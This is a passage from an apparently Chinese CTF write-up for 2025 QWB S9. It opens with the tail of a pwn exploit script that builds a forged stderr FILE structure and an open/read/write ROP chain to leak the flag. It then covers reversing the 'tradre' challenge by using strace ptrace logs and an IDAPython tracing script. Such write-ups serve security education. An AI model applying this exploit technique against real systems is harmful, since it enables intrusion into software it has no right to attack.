</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xfffff7f5</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;;sh</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x4A99D</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x130405</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x110</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1"># payload头地址</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">io_wfile_jumps</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sea</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choice: &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">sela</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choice: &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sela</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choice: &#34;</span><span class="p">,</span> <span class="n">stre</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFF9C</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rcx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mh">0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">257</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mh">0x70</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rcx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mh">0x80</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mh">0x70</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rcx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mh">0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;flag</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">se</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">op</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Flag:</p>
<p><img src="/img/2025-QWB-S9/44.png" alt="img"></p>
<h1 id="re">Re</h1>
<h2 id="tradre">tradre</h2>
<p>也是脑洞大开，看不懂ptrace怎么搞的，在网上找到了个ptrace hook方案，利用strace把所有ptrace调用的时候的参数数据等全部打印了出来，整出了个超大的trace文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Plain" data-lang="Plain"><span class="line"><span class="cl">strace -e trace=ptrace -o ./trace.log ./tradre
</span></span><span class="line"><span class="cl">--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=3936, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0} ---
</span></span><span class="line"><span class="cl">ptrace(PTRACE_GETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee620, rbx=0, r11=0x286, r10=0, r9=0x7f6c88f59740, r8=0xffffffff, rax=0x7ffd83aee4c0, rcx=0x7f6c8907805e, rdx=0, rsi=0, rdi=0x7ffd83aee4c0, orig_rax=0xffffffffffffffff, rip=0x400afd, cs=0x33, eflags=0x246, rsp=0x7ffd83aee430, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_PEEKTEXT, 3936, 0x400afd, [0x858bccffffffffbf]) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_PEEKDATA, 3936, 0x400afc, [0x8bccffffffffbfcc]) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_SETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee620, rbx=0, r11=0x286, r10=0, r9=0x7f6c88f59740, r8=0xffffffff, rax=0x7ffd83aee4c0, rcx=0x7f6c8907805e, rdx=0, rsi=0, rdi=0x7ffd83aee4c0, orig_rax=0xffffffffffffffff, rip=0x4018ce, cs=0x33, eflags=0x246, rsp=0x7ffd83aee428, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_CONT, 3936, NULL, 0)      = 0
</span></span><span class="line"><span class="cl">--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=3936, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0} ---
</span></span><span class="line"><span class="cl">ptrace(PTRACE_GETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x286, r10=0, r9=0x7f6c88f59740, r8=0xffffffff, rax=0x7ffd83aee4c0, rcx=0x7f6c8907805e, rdx=0, rsi=0, rdi=0x404938, orig_rax=0xffffffffffffffff, rip=0x4018e2, cs=0x33, eflags=0x206, rsp=0x7ffd83aee400, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_PEEKTEXT, 3936, 0x4018e2, [0xfe58858b48ccc990]) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_PEEKDATA, 3936, 0x4018e1, [0x58858b48ccc990cc]) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_POKEDATA, 3936, 0x7ffd83aee3f8, 0x401254) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_SETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x286, r10=0, r9=0x7f6c88f59740, r8=0xffffffff, rax=0x7ffd83aee4c0, rcx=0x7f6c8907805e, rdx=0, rsi=0, rdi=0x404938, orig_rax=0xffffffffffffffff, rip=0x400810, cs=0x33, eflags=0x206, rsp=0x7ffd83aee3f8, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_CONT, 3936, NULL, 0)      = 0
</span></span><span class="line"><span class="cl">--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=3936, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0} ---
</span></span><span class="line"><span class="cl">ptrace(PTRACE_GETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x246, r10=0x77, r9=0x9212a0, r8=0, rax=0x44, rcx=0x7f6c890708f7, rdx=0x1, rsi=0x1, rdi=0x404980, orig_rax=0xffffffffffffffff, rip=0x40125c, cs=0x33, eflags=0x202, rsp=0x7ffd83aee400, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_PEEKTEXT, 3936, 0x40125c, [0x55b60fe74588d831]) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_PEEKDATA, 3936, 0x40125b, [0xb60fe74588d831cc]) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_POKEDATA, 3936, 0x7ffd83aee3f8, 0x4012aa) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_SETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x246, r10=0x77, r9=0x9212a0, r8=0, rax=0x44, rcx=0x7f6c890708f7, rdx=0x1, rsi=0x1, rdi=0x404980, orig_rax=0xffffffffffffffff, rip=0x400810, cs=0x33, eflags=0x202, rsp=0x7ffd83aee3f8, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_CONT, 3936, NULL, 0)      = 0
</span></span><span class="line"><span class="cl">--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=3936, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0} ---
</span></span><span class="line"><span class="cl">ptrace(PTRACE_GETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x246, r10=0x77, r9=0x9212a0, r8=0x7f6c89178a70, rax=0x44, rcx=0x7f6c890708f7, rdx=0x1, rsi=0x1, rdi=0x4049c8, orig_rax=0xffffffffffffffff, rip=0x4012b2, cs=0x33, eflags=0x202, rsp=0x7ffd83aee400, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_PEEKTEXT, 3936, 0x4012b2, [0x45c7cc00000001bf]) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_PEEKDATA, 3936, 0x4012b1, [0xc7cc00000001bfcc]) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_POKEDATA, 3936, 0x7ffd83aee3f8, 0x4012e7) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_SETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x246, r10=0x77, r9=0x9212a0, r8=0x7f6c89178a70, rax=0x44, rcx=0x7f6c890708f7, rdx=0x1, rsi=0x1, rdi=0x4049c8, orig_rax=0xffffffffffffffff, rip=0x400810, cs=0x33, eflags=0x202, rsp=0x7ffd83aee3f8, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_CONT, 3936, NULL, 0)      = 0
</span></span><span class="line"><span class="cl">--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=3936, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0} ---
</span></span><span class="line"><span class="cl">ptrace(PTRACE_GETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x246, r10=0x77, r9=0x9212a0, r8=0x7f6c89178a70, rax=0x44, rcx=0x7f6c890708f7, rdx=0x1, rsi=0x1, rdi=0x404a10, orig_rax=0xffffffffffffffff, rip=0x4012ef, cs=0x33, eflags=0x202, rsp=0x7ffd83aee400, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_PEEKTEXT, 3936, 0x4012ef, [0x8b48fffffe30958b]) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_PEEKDATA, 3936, 0x4012ee, [0x48fffffe30958bcc]) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_POKEDATA, 3936, 0x7ffd83aee3f8, 0x400e55) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_SETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x246, r10=0x77, r9=0x9212a0, r8=0x7f6c89178a70, rax=0x44, rcx=0x7f6c890708f7, rdx=0x1, rsi=0x1, rdi=0x404a10, orig_rax=0xffffffffffffffff, rip=0x400810, cs=0x33, eflags=0x202, rsp=0x7ffd83aee3f8, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
</span></span><span class="line"><span class="cl">ptrace(PTRACE_CONT, 3936, NULL, 0)      = 0
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过观察前几行发现，每次中断后都会修改rip的值，从而实现了在碰到子进程一堆int 3干扰时能游刃有余的跑代码，所以一开始的思路就很明确，拿到整个汇编代码的trace记录。因此利用idapython和前面拿到的trace.log里的rip值对，实现了个反汇编指令trace，并保存到了文件进行分析</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">idc</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">idaapi</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ida_lines</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ida_ua</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --- 1. 确保 trace.log 文件在 IDA 可以访问的路径 ---</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">log_data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;trace.log&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">IOError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 如果找不到日志文件，只在 IDA 控制台打印错误</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;错误：无法打开 trace.log。请确保它与 IDB/I64 文件在同一目录。&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&#34;Log file not found&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --- 2. 定义输出文件名 ---</span>
</span></span><span class="line"><span class="cl"><span class="n">OUTPUT_FILENAME</span> <span class="o">=</span> <span class="s2">&#34;clean_asm_trace1.txt&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------------------------------------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_disasm_line</span><span class="p">(</span><span class="n">ea</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    获取指定地址处的反汇编指令行。
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">ea</span> <span class="o">==</span> <span class="n">idaapi</span><span class="o">.</span><span class="n">BADADDR</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">ida_lines</span><span class="o">.</span><span class="n">generate_disasm_line</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">line</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_disasm</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># 清理 IDA 生成的颜色标签</span>
</span></span><span class="line"><span class="cl">    <span class="n">cleaned_line</span> <span class="o">=</span> <span class="n">ida_lines</span><span class="o">.</span><span class="n">tag_remove</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">cleaned_line</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_clean_asm_path</span><span class="p">(</span><span class="n">start_ea</span><span class="p">,</span> <span class="n">end_ea</span><span class="p">,</span> <span class="n">file_handle</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    从 start_ea 线性反汇编，并将纯指令写入文件，直到遇到
</span></span></span><span class="line"><span class="cl"><span class="s2">    控制流指令或到达 end_ea。
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">start_ea</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="n">ea</span> <span class="o">=</span> <span class="n">start_ea</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 停止条件</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">ea</span> <span class="o">==</span> <span class="n">idaapi</span><span class="o">.</span><span class="n">BADADDR</span> <span class="ow">or</span> <span class="n">ea</span> <span class="o">&gt;=</span> <span class="n">end_ea</span> <span class="ow">or</span> <span class="n">ea</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="n">disasm</span> <span class="o">=</span> <span class="n">get_disasm_line</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">disasm</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 只写入清理后的汇编指令</span>
</span></span><span class="line"><span class="cl">            <span class="n">file_handle</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">disasm</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">mnem</span> <span class="o">=</span> <span class="n">ida_ua</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="c1"># 遇到控制流指令则停止此线性路径</span>
